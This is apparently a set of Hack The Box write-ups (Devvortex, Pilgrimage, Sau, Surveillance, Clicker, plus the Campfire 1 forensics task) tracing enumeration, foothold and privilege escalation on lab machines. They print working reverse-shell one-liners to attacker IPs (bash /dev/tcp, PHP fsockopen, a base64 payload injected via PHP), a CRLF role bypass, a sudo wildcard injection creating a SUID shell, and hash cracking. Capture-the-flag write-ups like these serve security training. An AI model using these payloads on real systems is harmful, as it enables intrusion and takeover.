belonging to our user.  And there we see root is executing the following command  2023/06/13 16:33:01 CMD: UID=0 PID=1419 | find /opt/gnuplot -name *.plt -exec gnuplot {} ;   So basically, gnuplot will execute any plt file found in /opt/gnuplot.  Now what we can do is to create a plt file that will start a reverse shell with the user root.  e.g  system &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.151/4444 0&gt;&amp;1'&quot;   Once the connection is established, we'll have root access in the console and we can read the flag. ","version":"Next","tagName":"h2"},{"title":"Campfire 1","type":0,"sectionRef":"#","url":"/docs/write-up/htb/sherlocks/campfire1","content":"Campfire 1 https://app.hackthebox.com/sherlocks/737 Alonzo Spotted Weird files on his computer and informed the newly assembled SOC Team. Assessing the situation it is believed a Kerberoasting attack may have occurred in the network. It is your job to confirm the findings by analyzing the provided evidence. You are provided with: 1- Security Logs from the Domain Controller 2- PowerShell-Operational Logs from the affected workstation 3- Prefetch Files from the affected workstation https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/https://www.hackthebox.com/blog/kerberoasting-attack-detectionhttps://techantidote.com/dfir-analyze-windows-event-logs-evtx-from-a-linux-machine-using-sigma-rules-chainsaw-and-evtx-dump/https://www.hackingarticles.in/forensic-investigation-prefetch-file/https://ericzimmerman.github.io/#!index.md Install: https://github.com/WithSecureLabs/chainsaw a tool to search what happened inside Windows Forensic artifactshttps://github.com/SigmaHQ/sigma rules to detect threatshttps://ericzimmerman.github.io/#!index.md And execute chainsaw to analyze the event logs: ./chainsaw hunt ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller -s ~/workspace/tools/sigma --mapping mappings/sigma-event-logs-all.yml -r ~/workspace/tools/sigma/rules --csv --output ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller/chainsaw To analyze prefetch files, we'll move to a Windows VM. There use pecmd application (from https://ericzimmerman.github.io/#!index.md) to generate the CSV: .\\PECmd.exe -d C:\\Users\\gal\\Desktop\\campfire1\\Workstation\\2024-05-21T033012_triage_asset\\ --csv . --csvf C:\\Users\\gal\\Desktop\\prefetch.csv Now, we'll use the Timeline explorer tool (from https://ericzimmerman.github.io/#!index.md) to analyze the csv","keywords":"","version":"Next"},{"title":"Devvortex","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/devvortex","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Devvortex","url":"/docs/write-up/htb/machines/easy/devvortex#enumeration","content":" First of all, we access via browser to the IP and got redirected to http://devvortex.htb/, let's add it to /etc/hosts.  Navigating a bit, we can see that it might be vulnerable to file inclusion, since requesting an non-existing page: http://devvortex.htb/aa.html showed a nginx server error  └─$ whatweb http://devvortex.htb http://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]   Let's try to extract all the files we can find in the server with fuff:  ffuf -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUFF -u http://devvortex.htb/FUFF.html   So far, nothing weird appears to be accessible:  about [Status: 200, Size: 7388, Words: 2258, Lines: 232, Duration: 40ms] contact [Status: 200, Size: 8884, Words: 3156, Lines: 290, Duration: 207ms] do [Status: 200, Size: 7603, Words: 2436, Lines: 255, Duration: 38ms] index [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 45ms] portfolio [Status: 200, Size: 6845, Words: 2083, Lines: 230, Duration: 42ms]   The images are served from http://devvortex.htb/images/hero-bg.jpg, if we try to access /images we get 403, let's try to fuzz the directories by checking if they return 403:  images [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms] css [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms] js [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 52ms] [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 47ms]   Nothing so far, let's check what other ports are open with nmap:  └─$ nmap devvortex.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:42 CET Nmap scan report for devvortex.htb (10.10.11.242) Host is up (0.038s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http   Let's check versions:  http  └─$ nmap devvortex.htb -p80 -sC -sV -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:43 CET Nmap scan report for devvortex.htb (10.10.11.242) Host is up (0.037s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DevVortex Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds   ssh  └─$ nmap devvortex.htb -p22 -sC -sV -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:43 CET Nmap scan report for devvortex.htb (10.10.11.242) Host is up (0.039s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds   Nothing seems weird, let's try to scan for ALL ports opened, nothing else found.  Let's enumerate subdomains by using the Host header:  ffuf -w /opt/github/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.devvortex.htb&quot; -u http://devvortex.htb -fl 8   Got this subdomain:  dev [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 88ms]   which looks like it's serving php content: http://dev.devvortex.htb/index.php  A simple scan with ffuf reveals interesting stuff:  .git/logs/ [Status: 403, Size: 3653, Words: 792, Lines: 70, Duration: 90ms] configuration [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 39ms] index [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 80ms]   With .git/log we can reconstruct the source code but it's returning a 403. configuration.php looks like a blank page, but it's a PHP page, so it would be interesting to note it for future usage.  Let's enumerate directories:  home [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 465ms]   http://dev.devvortex.htb/error.php --&gt; File not found.http://dev.devvortex.htb/any.php --&gt; File not found.  Looks a possible LFI attack vector, checking /robots.txt reveals this is a Joomla CMS page.  Following the paths in the robots.txt, we can see this URL: http://dev.devvortex.htb/administrator/index.php  Now that we know it's a Joomla CMS page, let's make a Google search, and we found the following links:  https://hackertarget.com/attacking-enumerating-joomla/https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomlahttps://vulncheck.com/blog/joomla-for-rce  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Devvortex","url":"/docs/write-up/htb/machines/easy/devvortex#foothold","content":" curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true   According to the articles, this URLS leaks the user/password for the mysql database used by joomla. However, the same user/password has been re-used for the Joomla CMS admin user  Once we have admin access to joomla instance, we can modify a template php files to include RCE, e.g.:  http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=id  Now let's send a reverse shell:  php -r '$sock=fsockopen(&quot;10.10.14.218&quot;,9001);popen(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);'   with URL-encode:  http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.218%22%2C9001%29%3Bpopen%28%22%2Fbin%2Fsh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27  We got a reverse-shell, but to www-data user, in order to get the flag, we need to get access to logan user.  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Devvortex","url":"/docs/write-up/htb/machines/easy/devvortex#lateral-movement","content":" According to the article, the leaked credentials are used to connect the MySQL database, so, let's connect to the DB re-using the credentials.  We go to the users table and see the hashed passwords:  mysql&gt; select username,password from sd4fg_users; +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | lewis | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u | | logan | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 | +----------+--------------------------------------------------------------+   We can try to crack the hash with hashcat:  hashcat exfil/hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt   and it worked, it reveal the password for the user logan, now we can connect with SSH and read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Devvortex","url":"/docs/write-up/htb/machines/easy/devvortex#privilege-escalation","content":" logan@devvortex:~$ sudo -l [sudo] password for logan: Matching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli   Just do a quick search about the sudoable app and found a poc to get root access: https://github.com/diego-tella/CVE-2023-1326-PoC  I tired and it just worked giving root access and we got root flag. ","version":"Next","tagName":"h2"},{"title":"Pilgrimage","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/pilgrimage","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/machines/easy/pilgrimage#enumeration","content":" Open ports: 80 and 22  22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0   └──╼ $whatweb pil.htb http://pil.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]   It's using PHP, the service looks useful to shrink images, it has a form where you upload an image and it will generate a new link with the shrink verion.  Brute-forcing the directory, we can see the webserver exposes the .git folder. Let's try to retrieve the code from there.  We can dump the exposed git folder and reconstruct the sources using https://github.com/arthaud/git-dumper  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/machines/easy/pilgrimage#foothold","content":" Checking the code, we observe a potential command injection here:   $mime = &quot;.png&quot;; $imagePath = $upload-&gt;getFullPath(); if(mime_content_type($imagePath) === &quot;image/jpeg&quot;) { $mime = &quot;.jpeg&quot;; } $newname = uniqid(); exec(&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot; . $upload-&gt;getName() . $mime . &quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot; . $newname . $mime);   We can abuse the exec by breaking the cmd using:  $upload-&gt;getName()$mime$newname  $mime and $newname are not controlled by the user, which left us only $upload-&gt;getName() to try the command injection. getName cannot be abused because the value does not depend on the user.   /** * @param array $_files represents the $_FILES array passed as dependency */ public function __construct(array $_files = array()) { if (!function_exists('exif_imagetype')) { $this-&gt;error = 'Function \\'exif_imagetype\\' Not found. Please enable \\'php_exif\\' in your php.ini'; } $this-&gt;_files = $_files; }   The construct only reads $_FILES and set it to the variable, name cannot be abused.  Looks like the service is using imagemagick to do the shrinking, we have the binary, so we can extract the version from an x64_86 computer (same arch as the binary):  ./magick --version 7.1.0-49   If we search for vulnerabilities for that library, we'll find something interesting: https://www.uptycs.com/blog/denial-of-servicedos-and-arbitrary-file-read-vulnerability-in-imagemagick.  There's a very nice explanation on how to exploit this vulnerability. After exploiting this we can read the /etc/passwd and identify a user named emily.  Tried to search for some flags inside the home with no luck. Tried to get SSH keys without any luck.  Going back to the source code, we see that there's a dashboard querying a database, we can try to download that database  Decoded hex string: b'SQLite format 3\\x00\\x10\\x00\\x01\\x01\\x00@ \\x   Looks like we got it, we'll need to tweak the format a bit.  We need to pass the hex bytes to actual bytes and we'll retrieve the whole sqlite database where there's a table with username-password and the password for emily is there, later we can connect with SSH and we're in as emily. Now we can read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/machines/easy/pilgrimage#privilege-escalation","content":" For privilege escalation, looks like the user emily can execute the magick command which belongs to root:  emily@pilgrimage:/var/www/pilgrimage.htb$ ls -lisa |grep &quot;magick&quot; 43806 26912 -rwxr-xr-x 1 root root 27555008 Feb 15 2023 magick   Analyzing the processes, we see an interesting script executed as root:  #!/bin/bash blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;) /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')&quot; binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot; for banned in &quot;${blacklist[@]}&quot;; do if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then /usr/bin/rm &quot;$filename&quot; break fi done done   Looks like this is performing some kind of scan of the files uploaded and uses the binwalk python module which analyse the uploaded file:  emily@pilgrimage:~$ binwalk -e /var/www/pilgrimage.htb/shrunk/6516e94e5aa54.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 7 x 7, 8-bit colormap, non-interlaced   The binary is just a convenient alias to the binwalk python library.  This looks promising...  From the very same github page of the project, there's a security warning:  Prior to Binwalk v2.3.3, extracted archives could create symlinks which point anywhere on the file system, potentially resulting in a directory traversal attack if subsequent extraction utilties blindly follow these symlinks. More generically, Binwalk makes use of many third-party extraction utilties which may have unpatched security issues; Binwalk v2.3.3 and later allows external extraction tools to be run as an unprivileged user using the run-as command line option (this requires Binwalk itself to be run with root privileges). Additionally, Binwalk v2.3.3 and later will refuse to perform extraction as root unless --run-as=root is specified.   Here we are dealing with binwalk v2.3.2, so it contains this vulnerability.  More details about the vulnerability:  https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/https://github.com/electr0sm0g/CVE-2022-4510  The idea is to generate the payload to open a connection and upload it via SCP with the emily user. If we upload it via the web it will not open the connection since the image generated by convert, will not have the malicious payload to abuse binwalk. ","version":"Next","tagName":"h2"},{"title":"Sau","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/sau","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/machines/easy/sau#enumeration","content":" Initial scan shows some open ports:  └──╼ $nmap sau.htb -oA scans/initial_scan -Pn -n Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:10 BST Nmap scan report for sau.htb (10.10.11.224) Host is up (0.14s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http 55555/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds   Port 80 is behind a firewall.  SSH:  └──╼ $nmap sau.htb -oA scans/ssh_scan -Pn -n -p22 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:11 BST Nmap scan report for sau.htb (10.10.11.224) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds   We are dealing with an ubuntu focal.  55555: The nmap is taking a lot of time in determining the service. However, if we curl the port, we can see that it's a webserver:  └──╼ $curl -vvv sau.htb:55555 * Trying 10.10.11.224:55555... * Connected to sau.htb (10.10.11.224) port 55555 (#0) &gt; GET / HTTP/1.1 &gt; Host: sau.htb:55555 &gt; User-Agent: curl/7.88.1 &gt; Accept: */* &gt; &lt; HTTP/1.1 302 Found &lt; Content-Type: text/html; charset=utf-8 &lt; Location: /web &lt; Date: Wed, 27 Sep 2023 18:17:35 GMT &lt; Content-Length: 27 &lt; &lt;a href=&quot;/web&quot;&gt;Found&lt;/a&gt;.   The result from nmap came back and say that it cannot determine the service. We can see that if has something to do with baskets:  | invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$   If we curl the home page, we can see something interesting:   &lt;small&gt; Powered by &lt;a href=&quot;https://github.com/darklynx/request-baskets&quot;&gt;request-baskets&lt;/a&gt; | Version: 1.2.1 &lt;/small&gt;   Checking the website source code from the browser, we can see that there's a basket API which used a &quot;Master token&quot; for auth.   $.ajax({ method: &quot;POST&quot;, url: &quot;/api/baskets/&quot; + basket, headers: { &quot;Authorization&quot; : sessionStorage.getItem(&quot;master_token&quot;) }   After reading a bit, looks like the service is a server used to display HTTP requests  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/machines/easy/sau#foothold","content":" Knowing the service and version, we can search for CVEs.  https://github.com/entr0pie/CVE-2023-27163  Looks like we can abuse of the request-baskets to access the webserver listening on port 80 but firewalled and...it's working:  ┌─[parrot@parrot]─[~/workspace/gal/htb/machines/sau/exploits] └──╼ $./CVE-2023-27163.sh http://sau.htb:55555/ http://127.0.0.1 Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163 &gt; Creating the &quot;zfqies&quot; proxy basket... &gt; Basket created! &gt; Accessing http://sau.htb:55555/zfqies now makes the server request to http://127.0.0.1. &gt; Authorization: sXxaCFrbUXtDv3qiltNRTbGju6JosLVH8fL2DkqyeiN9   └──╼ $curl -vvv http://sau.htb:55555/zfqies * Trying 10.10.11.224:55555... * Connected to sau.htb (10.10.11.224) port 55555 (#0) &gt; GET /zfqies HTTP/1.1 &gt; Host: sau.htb:55555 &gt; User-Agent: curl/7.88.1 &gt; Accept: */* &gt; &lt; HTTP/1.1 200 OK &lt; Cache-Control: no-cache &lt; Connection: close &lt; Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content; &lt; Content-Type: text/html &lt; Date: Thu, 28 Sep 2023 09:29:31 GMT &lt; Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT &lt; Server: Maltrail/0.53 &lt; Transfer-Encoding: chunked &lt; &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no&quot;&gt; &lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&gt;   In the firewalled webserver there's an instance of maltrail 0.53 service, which making a quick google search has a OS command injection vulnerability in the username field of the /login endpoint. There's even a metasploit module to explot it. See: https://packetstormsecurity.com/files/174221/Maltrail-0.53-Unauthenticated-Command-Injection.html  I've made some attempts with the bash and sh payloads from reverse shell and base64 encoded, also play around with data encoding (url encode, form encode, ...)  Finally I've made it work by using a python payload, base64 and form encoding.  We can read the user flag  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/machines/easy/sau#privilege-escalation","content":" sudo -l shows that the user can execute systemctl status as any user (including root):  (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service   Let's search how to explot that in GTFO bins, looks like the default pager for systemctl is less, we can have access to root by just typing: !sh and voila!  We can read root flag. ","version":"Next","tagName":"h2"},{"title":"Surveillance","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/medium/surveillance","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Surveillance","url":"/docs/write-up/htb/machines/medium/surveillance#enumeration","content":" 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Surveillance |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   ubuntu jammy running nginx 1.18.0  Browsing the web, we can see the following link: https://github.com/craftcms/cms/tree/4.4.14. Looks like it's made with craftcms and we have the precise version.  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Surveillance","url":"/docs/write-up/htb/machines/medium/surveillance#foothold","content":" Looks like it's vulnerable to a RCE vulnerability (fixed by 4.4.15):  https://putyourlightson.com/articles/critical-craft-cms-security-vulnerabilityhttps://blog.calif.io/p/craftcms-rcehttps://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226  With latest POC, we got foothoold, now we can run a reverse shell, improve it and start investigating.  Right now we can acess as wwww-data.  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Surveillance","url":"/docs/write-up/htb/machines/medium/surveillance#lateral-movement","content":" In home we found two users:  www-data@surveillance:~/html/craft/web/cpresources$ ls /home matthew zoneminder   There are many things listening in localhost:  www-data@surveillance:~/html/craft$ netstat -na |grep &quot;LISTEN&quot; tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN tcp6 0 0 :::22 :::* LISTEN   Looks like there's a ZoneMinder server running in port 8080 but only listening in localhost. Looks really interesting for later.  I managed to exfiltrate the contents of /var/www and found the configuration to connect to mysql database which contains an entry for admin user:  MariaDB [craftdb]&gt; select username,fullName,password from users; +----------+-----------+--------------------------------------------------------------+ | username | fullName | password | +----------+-----------+--------------------------------------------------------------+ | admin | Matthew B | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe | +----------+-----------+--------------------------------------------------------------+   If we manage to crack the hash, we might get the password of matthew user. Checking the contents, of the web there's a backup of the database which contains a different hash, it might be worth trying to crack it.  Crack it, got the user password for matthew: Looks like there's a ZoneMinder server running in port 8080 but only listening in localhost. Looks really interesting for later.  I managed to exfiltrate the contents of /var/www and found the configuration to connect to mysql database which contains an entry for admin user:  MariaDB [craftdb]&gt; select username,fullName,password from users; +----------+-----------+--------------------------------------------------------------+ | username | fullName | password | +----------+-----------+--------------------------------------------------------------+ | admin | Matthew B | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe | +----------+-----------+--------------------------------------------------------------+   If we manage to crack the hash, we might get the password of matthew user. Checking the contents, of the web there's a backup of the database which contains a different hash, it might be worth trying to crack it.  Crack it, got the user password for matthew. Now we can connect with SSH and read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Surveillance","url":"/docs/write-up/htb/machines/medium/surveillance#privilege-escalation","content":" The user cannot run sudo. Now that we have SSH access, we can do port forwarding to access the instance running in localhost:  ssh -L 8080:localhost:8080 matthew@surveillance.htb   We can have access to the ZoneMinder thing by using the user admin and the same password as matthew.  Now we can see the version: v1.36.32  Looks like it's vulnerable to https://pentest-tools.com/vulnerabilities-exploits/zoneminder-snapshots-command-injection_22437 because it mentions prior versions to 1.36.33 and 1.37.33  Since the process does not appear for the user matthew, it might be running for another user or for root. Either way, we can try to exploit the RCE vulnerability and continue from there.  The POC worked perfectly and we got access to user zoneminder. Now let's improve the shell and continue.  Checking what the user can do, looks like it can execute some script as root without specifying a password:  zoneminder@surveillance:~$ sudo -l Matching Defaults entries for zoneminder on surveillance: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User zoneminder may run the following commands on surveillance: (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl * zoneminder@surveillance:~$   This means any user can run any binary called zm*.pl in the /usr/bin/ directory under the root context, no password will be prompted. Morevoer, any option can be passed to the binary since it uses a wildcard in the sudoers file. This is a wide open configuration which can be abused using wildcard injection. Prepare a shell exploit.  echo 'cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash' &gt; /var/tmp/exploit.sh chmod +x /var/tmp/exploit.sh   Now just run any zm* binary and inject a command calling the exploit, it will be executed under the root context. For example, using zmupdate with the --version option will force the tool to upgrade the database, and it allows us to inject a command to execute the exploit:  sudo /usr/bin/zmupdate.pl --version=1 --user='$(/var/tmp/exploit.sh)'   Now execute the copied bash with -p and we got root access. ","version":"Next","tagName":"h2"},{"title":"Clicker","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/medium/clicker","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Clicker","url":"/docs/write-up/htb/machines/medium/clicker#enumeration","content":" The machine has a NFS share sharing the source code  Checking the source code we see a potential SQL injection following a similar pattern of this:  https://phpdelusions.net/pdo/sql_injection_example  curl -vv 'http://clicker.htb/save_game.php?clicks=0&amp;level=0&amp;nickname=blabla' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'  We can arbirtraryly change key-values in the database in the query, however, there's a explicit check to try to change the role:  \tforeach($_GET as $key=&gt;$value) { if (strtolower($key) === 'role') { // prevent malicious users to modify role header('Location: /index.php?err=Malicious activity detected!'); die; }   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Clicker","url":"/docs/write-up/htb/machines/medium/clicker#foothold","content":" In order to avoid this, we need to mask the key somehow, an idea can be to bypass that restriction using CR-LF injection:  curl -vv 'http://clicker.htb/save_game.php?role%0a=Admin' -H 'Cookie: PHPSESSID=k002rk00q1d5v73c3nvjgabeie'   Now, we are admin in the PHP application and we can perform more enumerations.  We discovered some interesting pages:  admin.php: Generates a list with the top users.export.php: Generate a file exports/top_players_fwhb6q51, no more info. Maybe it's good to do user enumeration?diagnostic.php: Protected by a md5 token  We can access the generated files by the exporting function...  curl -vv 'http://clicker.htb/export.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=k002rk00q1d5v73c3nvjgabeie' --data-raw 'threshold=0&amp;extension=html'   We can change the extension to PHP.  curl -vv 'http://clicker.htb/export.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh' --data-raw 'threshold=0&amp;extension=php'   We can change the nickname of the user to execute arbitrary PHP code. We'll change the nickname to make execute the following PHP code:  &lt;?php $output = exec('id');echo &quot;$output&quot;;?&gt;   curl -vv 'http://clicker.htb/save_game.php?clicks=0&amp;level=0&amp;nickname=%3C%3Fphp%20echo%20%221234%22%3B%3F%3E' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'   Now we can repeat the process but to run a reverse shell:  &lt;?php system(&quot;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx|base64 -d|bash&quot;)?&gt;   curl -vv 'http://clicker.htb/save_game.php?clicks=0&amp;level=0&amp;nickname=%3C%3Fphp%20system%28%22echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx%7Cbase64%20-d%7Cbash%22%29%3F%3E' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'   We get a shell for the user www-data. We discovered a user named jack by checking /etc/passwd  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Clicker","url":"/docs/write-up/htb/machines/medium/clicker#lateral-movement","content":" During enumeration we discover there are two files in /opt files:  monitor.sh: script that downloads the output of diagnostic.php, the user needs to be rootmanage/READMEmanage/executequery: binary file that setup up all the environment  Let's download it and analyse it using ghidra ...   iVar1 = atoi(*(char **)(param_2 + 8)); pcVar3 = (char *)calloc(0x14,1); switch(iVar1) { case 0: puts(&quot;ERROR: Invalid arguments&quot;); uVar2 = 2; goto LAB_001015e1; case 1: strncpy(pcVar3,&quot;create.sql&quot;,0x14); break; case 2: strncpy(pcVar3,&quot;populate.sql&quot;,0x14); break; case 3: strncpy(pcVar3,&quot;reset_password.sql&quot;,0x14); break; case 4: strncpy(pcVar3,&quot;clean.sql&quot;,0x14); break; default: strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14); }   There's a default option that would copy any provided value in param_2 into pcVar3   local_98 = 0x616a2f656d6f682f; local_90 = 0x69726575712f6b63; local_88 = 0x2f7365; sVar4 = strlen((char *)&amp;local_98); sVar5 = strlen(pcVar3); __dest = (char *)calloc(sVar5 + sVar4 + 1,1); strcat(__dest,(char *)&amp;local_98); strcat(__dest,pcVar3); setreuid(1000,1000); iVar1 = access(__dest,4); if (iVar1 == 0) { local_78 = 0x6e69622f7273752f; local_70 = 0x2d206c7173796d2f;   local_98 value corresponds to the string /home/jack. So, what it's doing this program is forcing the provided file is inside /home/jack 